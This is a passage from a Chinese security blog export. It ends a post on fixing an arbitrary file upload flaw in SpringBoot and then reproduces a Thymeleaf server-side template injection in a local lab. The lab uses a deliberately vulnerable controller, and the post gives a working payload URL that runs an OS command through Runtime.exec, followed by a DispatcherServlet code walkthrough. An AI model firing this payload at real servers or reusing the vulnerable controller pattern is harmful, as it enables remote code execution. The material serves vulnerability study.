class=\"keyword\">import</span> java.nio.file.Paths;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Arrays;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.List;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by IntelliJ IDEA.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Author</span>: Garck3h</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Date</span>: 2023/6/2</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Time</span>: 21:56</span></span><br><span class=\"line\"><span class=\"comment\"> * Life is endless, and there is no end to it.</span></span><br><span class=\"line\"><span class=\"comment\"> **/</span></span><br><span class=\"line\"><span class=\"meta\">@RestController</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">FileUploadController</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@PostMapping(&quot;/upload&quot;)</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">uploadFile</span><span class=\"params\">(<span class=\"meta\">@RequestParam(&quot;file&quot;)</span> MultipartFile file)</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (file.isEmpty()) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;文件为空!&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//这段代码实现了校验文件上传的后缀，只能是png,jpg,git后缀，其它后缀就显示文件非法</span></span><br><span class=\"line\">        <span class=\"comment\">// 定义允许上传的文件类型</span></span><br><span class=\"line\">        List&lt;String&gt; allowedExtensions = Arrays.asList(<span class=\"string\">&quot;png&quot;</span>, <span class=\"string\">&quot;jpg&quot;</span>, <span class=\"string\">&quot;gif&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 获取上传文件的后缀名</span></span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">originalFileName</span> <span class=\"operator\">=</span> file.getOriginalFilename();</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">extension</span> <span class=\"operator\">=</span> originalFileName.substring(originalFileName.lastIndexOf(<span class=\"string\">&#x27;.&#x27;</span>) + <span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 判断文件类型是否在允许的范围内</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!allowedExtensions.contains(extension)) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 不支持该类型文件，抛出异常或给出提示信息</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;文件类型不合法!&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 文件类型合法，执行保存操作</span></span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                <span class=\"comment\">// 获取项目资源路径</span></span><br><span class=\"line\">                <span class=\"type\">String</span> <span class=\"variable\">resourcePath</span> <span class=\"operator\">=</span> System.getProperty(<span class=\"string\">&quot;user.dir&quot;</span>);</span><br><span class=\"line\">                </span><br><span class=\"line\">                <span class=\"comment\">// 定义存储文件的目录路径和文件全名</span></span><br><span class=\"line\">                <span class=\"type\">String</span> <span class=\"variable\">folderPath</span> <span class=\"operator\">=</span> resourcePath + File.separator + <span class=\"string\">&quot;data&quot;</span> + File.separator + <span class=\"string\">&quot;upload&quot;</span> + File.separator;</span><br><span class=\"line\">                <span class=\"comment\">//对文件重命名，以防止恶意覆盖其他文件或者构造路径遍历攻击</span></span><br><span class=\"line\">                <span class=\"type\">String</span> <span class=\"variable\">fileName</span> <span class=\"operator\">=</span> System.currentTimeMillis() + <span class=\"string\">&quot;_&quot;</span> + file.getOriginalFilename();</span><br><span class=\"line\">                <span class=\"comment\">// 判断文件名是否合法，即不存在 ../ 字符串</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (originalFileName.contains(<span class=\"string\">&quot;../&quot;</span>)) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"string\">&quot;不允许包含../&quot;</span>;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;<span class=\"comment\">// 文件名合法，执行保存操作</span></span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"comment\">// 若文件夹不存在，则创建文件夹</span></span><br><span class=\"line\">                    <span class=\"type\">File</span> <span class=\"variable\">folderDir</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">File</span>(folderPath);</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (!folderDir.exists()) &#123;</span><br><span class=\"line\">                        folderDir.mkdirs();</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"comment\">// 将上传的文件写入磁盘</span></span><br><span class=\"line\">                    <span class=\"type\">byte</span>[] bytes = file.getBytes();</span><br><span class=\"line\">                    <span class=\"type\">Path</span> <span class=\"variable\">path</span> <span class=\"operator\">=</span> Paths.get(folderPath + fileName);</span><br><span class=\"line\">                    Files.write(path, bytes);</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"string\">&quot;文件上传成功!\\n&quot;</span>+ <span class=\"string\">&quot;路径：&quot;</span>+ path;</span><br><span class=\"line\"></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"string\">&quot;文件上传失败!&quot;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>测试..&#x2F;是否生效，测试结果OK</p>\n<p><img src=\"OmAUDMK0Nx_duQtx8GS-ziogLfdaunfMIWqcIVm_R8E.png\" alt=\"image\"></p>\n<p>测试后缀是否生效，测试结果OK</p>\n<p><img src=\"rDRU9a4qMuz3H1GxpFiq9xAMuwDQy7SE0jJlwx9KBvE.png\" alt=\"image\"></p>\n<p>测试重命名是否生效，测试结果OK</p>\n<p><img src=\"Hf6RXf630FYN8pXGqJnB7ogXOr2gQY5GEpzAWx-pxHY.png\" alt=\"image\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>本文简单诠释了一下SpringBoot任意文件上传且路径可控的情况下带来的一些危害。以一个简单的代码例子来进行分析，分别从三个姿势来进行深入利用。最后对demo进行了简单的修复，主要是从校验文件类型、重命名文件和过滤..&#x2F;来实现。</p>\n<p><strong>声明：</strong><em>本文仅限技术研究与交流，严禁用于非法用途，否则产生的一切后果自行承担！转载_请注明来源!!!</em></p>\n","categories":["Java安全"],"tags":["漏洞复现","RCE","文件上传","SpringBoot"]},{"title":"Thymeleaf的SSTI复现与分析","url":"/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/","content":"<h1 id=\"Thymeleaf的SSTI复现与分析\"><a href=\"#Thymeleaf的SSTI复现与分析\" class=\"headerlink\" title=\"Thymeleaf的SSTI复现与分析\"></a>Thymeleaf的SSTI复现与分析</h1><h2 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h2><p>Thymeleaf 是一个流行的 Java Web 视图模板引擎，可以方便地将数据和 HTML 模板结合起来生成网页。但是在使用 Thymeleaf 的过程中，如果没有严格控制用户输入，可能会发生模板注入漏洞。</p>\n<h2 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h2><p><img src=\"SfzSoqBmvjC9NjT6RvVuNoj6B6l7hgM9PoMDmY0vCkQ.png\" alt=\"image\"></p>\n<p>添加Java包和resources包</p>\n<p><img src=\"ecB_yscdSID4P_bTQNVI-zYUR7Meu-HHd9VlJfybx7w.png\" alt=\"image\"></p>\n<p>pom.xml</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- 继承父包 --&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">parent</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-starter-parent<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.3.5.RELEASE<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">parent</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependencies</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!-- web启动jar --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-starter-web<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.projectlombok<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>lombok<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.18.6<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">scope</span>&gt;</span>provided<span class=\"tag\">&lt;/<span class=\"name\">scope</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>application.yml，放在resources(原本没有，需要创建)</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\">server:</span><br><span class=\"line\">  port: 8090</span><br><span class=\"line\">spring:</span><br><span class=\"line\">  thymeleaf:</span><br><span class=\"line\">    prefix: classpath:/templates/</span><br><span class=\"line\">    suffix: .html</span><br><span class=\"line\">    mode: HTML5</span><br><span class=\"line\">    encoding: UTF-8</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>启动类（放在com.garck3h下）</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.boot.SpringApplication;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by IntelliJ IDEA.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Author</span> Garck3h</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Date</span> 2023/5/11 3:45 下午</span></span><br><span class=\"line\"><span class=\"comment\"> * Life is endless, and there is no end to it.</span></span><br><span class=\"line\"><span class=\"comment\"> **/</span></span><br><span class=\"line\"><span class=\"meta\">@SpringBootApplication</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Application</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        SpringApplication.run(Application.class,args);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>Handler</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.controller;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.cache.annotation.Cacheable;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.stereotype.Controller;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by IntelliJ IDEA.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Author</span> Garck3h</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Date</span> 2023/5/12 3:39 下午</span></span><br><span class=\"line\"><span class=\"comment\"> * Life is endless, and there is no end to it.</span></span><br><span class=\"line\"><span class=\"comment\"> **/</span></span><br><span class=\"line\"><span class=\"meta\">@Controller</span></span><br><span class=\"line\"><span class=\"meta\">@RequestMapping(&quot;/index1&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ThyController</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@GetMapping(&quot;/index2&quot;)</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">index</span><span class=\"params\">(<span class=\"meta\">@RequestParam</span> String index3)</span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;index...&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> index;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>正常访问URL，出现了500报错，因为此时我没有对应的模板文件才会报错，但是这个不影响漏洞的利用</p>\n<p><img src=\"9PW7aCWq0XIh8hrnZNkKgFlyqLTnstDjCszcSJRwe8w.png\" alt=\"image\"></p>\n<h2 id=\"复现\"><a href=\"#复现\" class=\"headerlink\" title=\"复现\"></a>复现</h2><p>payload</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">192.168</span><span class=\"number\">.163</span><span class=\"number\">.154</span>:<span class=\"number\">8090</span>/index1/index2?index3=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%<span class=\"number\">20</span>-a%20Calculator%<span class=\"number\">22</span>).getInputStream()).next()%7d__::.x</span><br></pre></td></tr></table></figure>\n<p><img src=\"w46yACUTr-5KrP5NK2MiVbv5Uan0SUbiGgyxdjkaVKU.png\" alt=\"image\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>先讲一下SpringMVC的一个工作流程</p>\n<ol>\n<li>客户端发起 HTTP 请求，请求会到达 DispatcherServlet。</li>\n<li>DispatcherServlet 接收到请求后会通过 HandlerMapping 确定当前请求需要调用哪个 Controller 对象，默认情况下使用的是 RequestMappingHandlerMapping。</li>\n<li>HandlerAdapter 负责将请求与 Controller 方法进行绑定，并处理方法的参数，准备请求数据。</li>\n<li>Controller 执行相应的业务逻辑，创建并绑定 Model 和 View，并返回 ModelAndView。</li>\n<li>ViewResolver 根据 View 的指定格式解析目标视图为完整的视图，并返回给 DispatcherServlet。</li>\n<li>DispatcherServlet 发送 Model 数据给 View 以便完成渲染，生成最终的响应结果。</li>\n<li>最终的响应结果返回给客户端浏览器，已经完成了整个 Spring MVC 的请求响应过程。</li>\n</ol>\n<p>在Spring MVC框架中是由DispatcherServlet作为前端控制器（Front Controller）来控制请求和响应、路由请求和处理 HTTP 请求的。</p>\n<p>org.springframework.web.servlet.DispatcherServlet</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.controller;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.request.ServletWebRequest;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.request.async.WebAsyncManager;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.request.async.WebAsyncUtils;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.HandlerAdapter;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.HandlerExecutionChain;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.util.NestedServletException;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by IntelliJ IDEA.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Author</span> Garck3h</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Date</span> 2023/5/18 4:19 下午</span></span><br><span class=\"line\"><span class=\"comment\"> * Life is endless, and there is no end to it.</span></span><br><span class=\"line\"><span class=\"comment\"> **/</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">doDispath</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">doDispatch</span><span class=\"params\">(HttpServletRequest request, HttpServletResponse response)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">         <span class=\"comment\">// 对于multipart类型需要特殊处理</span></span><br><span class=\"line\">        <span class=\"type\">HttpServletRequest</span> <span class=\"variable\">processedRequest</span> <span class=\"operator\">=</span> request;</span><br><span class=\"line\">        <span class=\"type\">HandlerExecutionChain</span> <span class=\"variable\">mappedHandler</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"type\">boolean</span> <span class=\"variable\">multipartRequestParsed</span> <span class=\"operator\">=</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">WebAsyncManager</span> <span class=\"variable\">asyncManager</span> <span class=\"operator\">=</span> WebAsyncUtils.getAsyncManager(request);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                <span class=\"comment\">//定义模型与视图</span></span><br><span class=\"line\">                <span class=\"type\">ModelAndView</span> <span class=\"variable\">mv</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">                <span class=\"comment\">//异常</span></span><br><span class=\"line\">                <span class=\"type\">Object</span> <span class=\"variable\">dispatchException</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                     <span class=\"comment\">// 预处理multipart文件上传数据，检查请求是否包含multipart/form-data</span></span><br><span class=\"line\">                    processedRequest = <span class=\"built_in\">this</span>.checkMultipart(request);</span><br><span class=\"line\">                    multipartRequestParsed = processedRequest != request;</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"comment\">// 获取处理器（通过RequestMapping找到希望匹配的处理器）</span></span><br><span class=\"line\">                    mappedHandler = <span class=\"built_in\">this</span>.getHandler(processedRequest);</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (mappedHandler == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                        <span class=\"comment\">// 如果没有找到合适的Handler，则返回404错误页面</span></span><br><span class=\"line\">                        <span class=\"built_in\">this</span>.noHandlerFound(processedRequest, response);</span><br><span class=\"line\">                        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"comment\">// 根据获取的 Handler （处理方法或者对象）获取对应的 HandlerAdapter</span></span><br><span class=\"line\">                    <span class=\"type\">HandlerAdapter</span> <span class=\"variable\">ha</span> <span class=\"operator\">=</span> <span class=\"built_in\">this</span>.getHandlerAdapter(mappedHandler.getHandler());</span><br><span class=\"line\">                    <span class=\"comment\">// 获取 Http 请求方法类型，以 GET 上述情况为例</span></span><br><span class=\"line\">                    <span class=\"type\">String</span> <span class=\"variable\">method</span> <span class=\"operator\">=</span> request.getMethod();</span><br><span class=\"line\">                    <span class=\"type\">boolean</span> <span class=\"variable\">isGet</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;GET&quot;</span>.equals(method);</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (isGet || <span class=\"string\">&quot;HEAD&quot;</span>.equals(method)) &#123;</span><br><span class=\"line\">                        <span class=\"comment\">// 执行 Last-Modified 头信息验证缓存是否需要更新，判断是否需要返回304</span></span><br><span class=\"line\">                        <span class=\"type\">long</span> <span class=\"variable\">lastModified</span> <span class=\"operator\">=</span> ha.getLastModified(request, mappedHandler.getHandler());</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> ((<span class=\"keyword\">new</span> <span class=\"title class_\">ServletWebRequest</span>(request, response)).checkNotModified(lastModified) &amp;&amp; isGet) &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"comment\">// 判断拦截器是否preHandle执行成功，如果有一个没有执行成功，则直接返回404错误页面；同时记录日志</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (!mappedHandler.applyPreHandle(processedRequest, response)) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"comment\">// 调用Handler并获取返回结果（该结果严格意义上只是View和Model的容器）</span></span><br><span class=\"line\">                    mv = ha.handle(processedRequest, response, mappedHandler.getHandler());</span><br><span class=\"line\">                    <span class=\"comment\">// 检查异步任务，并不会立即执行，而是由WebAsyncManager 后期完成调度管理</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                        <span class=\"comment\">// 对ModelAndView进行预处理</span></span><br><span class=\"line\">                    <span class=\"built_in\">this</span>.applyDefaultViewName(processedRequest, mv);</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"comment\">//执行Handler的后置处理器</span></span><br><span class=\"line\">                    mappedHandler.applyPostHandle(processedRequest, response, mv);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (Exception var20) &#123;</span><br><span class=\"line\">                    dispatchException = var20;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (Throwable var21) &#123;</span><br><span class=\"line\">                    <span class=\"comment\">// 添加try-catch代码块来捕捉所有Throwable类型的异常</span></span><br><span class=\"line\">                    dispatchException = <span class=\"keyword\">new</span> <span class=\"title class_\">NestedServletException</span>(<span class=\"string\">&quot;Handler dispatch failed&quot;</span>, var21);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">// 利用返回的mv进行页面渲染</span></span><br><span class=\"line\">                <span class=\"built_in\">this</span>.processDispatchResult(processedRequest, response, mappedHandler, mv, (Exception)dispatchException);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (Exception var22) &#123;</span><br><span class=\"line\">                <span class=\"built_in\">this</span>.triggerAfterCompletion(processedRequest, response, mappedHandler, var22);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (Throwable var23) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                 <span class=\"comment\">//对页面渲染完成调用拦截器中的AfterCompletion方法</span></span><br><span class=\"line\">                <span class=\"built_in\">this</span>.triggerAfterCompletion(processedRequest, response, mappedHandler, <span class=\"keyword\">new</span> <span class=\"title class_\">NestedServletException</span>(<span class=\"string\">&quot;Handler processing failed&quot;</span>, var23));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (mappedHandler != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                    mappedHandler.applyAfterConcurrentHandlingStarted(processedRequest, response);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (multipartRequestParsed) &#123;</span><br><span class=\"line\">                <span class=\"comment\">//清除由多个部分组成的请求使用的所有资源</span></span><br><span class=\"line\">                <span class=\"built_in\">this</span>.cleanupMultipart(processedRequest);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"doDispatch\"><a href=\"#doDispatch\" class=\"headerlink\" title=\"doDispatch\"></a>doDispatch</h3><p>checkMultipart </p>\n<p>判断请求是否为 Multipart 类型，并对请求处理进行必要的操作</p>\n<p>getHandler </p>\n<p>调用getHandler() 方法来确定具体的 Controller 处理器</p>\n<p>调用各自的 getHandler(request) 方法来获取对应的 HandlerExecutionChain 对象</p>\n<p>这个对象包含了要执行的controller handler和其拦截器链，它是一个管理一组拦截器链的实例，其中包含了一个或多个拦截器 HandlerInterceptor 以及目标对象和目标方法。</p>\n<p>如果某个 HandlerMapping 的 getHandler() 方法返回了该对象，则表示该 HandlerMapping 能够处理当前请求，此时就会将 HandlerExecutionChain 返回给 DispatcherServlet，让其执行相关业务逻辑</p>\n<h3 id=\"1-前端控制器拦截用户的请求\"><a href=\"#1-前端控制器拦截用户的请求\" class=\"headerlink\" title=\"1.前端控制器拦截用户的请求\"></a><strong>1.前端控制器拦截用户的请求</strong></h3><p>我们直接看doDispatch这个方法，首先是和传统的servlet一样传入：HttpServletRequest request, HttpServletResponse response。</p>\n<p>然后就是定义一些各种类型的变量，做初始化操作。</p>\n<p><img src=\"gM4QKwKFcwJHZPVp1K7uRlBPWxxNOfeC5PSvPs1fBjs.png\" alt=\"image\"></p>\n<p>然后来到513行是调用checkMultipart 方法检查是否包含multipart&#x2F;form-data 编码方式，有的话，就进行进一步的处理。514行将 multipartRequestParsed 变量设置为 true。</p>\n<p><img src=\"X8oo0HHQq3yTW7lfM2Ph1H4Mxl7WjJDEojfgzJH7YO0.png\" alt=\"image\"></p>\n<h3 id=\"2-处理器映射器执行用户的请求\"><a href=\"#2-处理器映射器执行用户的请求\" class=\"headerlink\" title=\"2.处理器映射器执行用户的请求\"></a><strong>2.处理器映射器执行用户的请求</strong></h3><p>然后来到515行的getHandler，我们直接进去分析。首先是判断一下handlerMappings是否为空。</p>\n<p><img src=\"pANthOzVC_ScNmdNOWddChdrfod16NZNy7kYrWl0yq0.png\" alt=\"image\"></p>\n<p>handlerMappings的初始化是在initHandlerMappings中进行的，扫描容器中所有的 HandlerMapping Bean，并将这些 Bean 添加到 handlerMappings 列表中。</p>\n<p><img 